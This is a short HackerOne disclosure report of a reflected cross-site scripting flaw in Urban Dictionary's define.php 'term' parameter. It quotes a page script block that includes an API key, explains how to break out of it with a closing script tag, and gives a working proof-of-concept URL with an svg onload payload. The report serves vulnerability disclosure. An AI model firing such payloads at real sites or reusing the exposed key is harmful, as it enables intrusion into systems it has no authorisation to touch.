# HackerOne Report: Reflective Xss Vulnerability 
**Report ID:** 80694
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic

## Vulnerability Information & PoC
The is located in here http://www.urbandictionary.com/define.php?term=
in the snippet of code from your site
 <script>
  //<![CDATA[
    (function() {
      window.Page = {};
    
      Page.globals = {
        "sfg_flag": true,
        "rails_env": "production",
        "locale": "en-US",
        "api_path": "http://api.urbandictionary.com/v0",
        "api_key": "ab71d33b15d36506acf1e379b0ed07ee",
        "dfp_test": null,
        "normalized": "lol"
You can escape by closing it with </script> effectively breaking out and allowing you to add your own html code to the site


Proof of concept link: http://www.urbandictionary.com/define.php?term=Lol%3C/script%3E%3Csvg%20onload=confirm%28document.domain%29%3E

## Discussion & Remediation Timeline
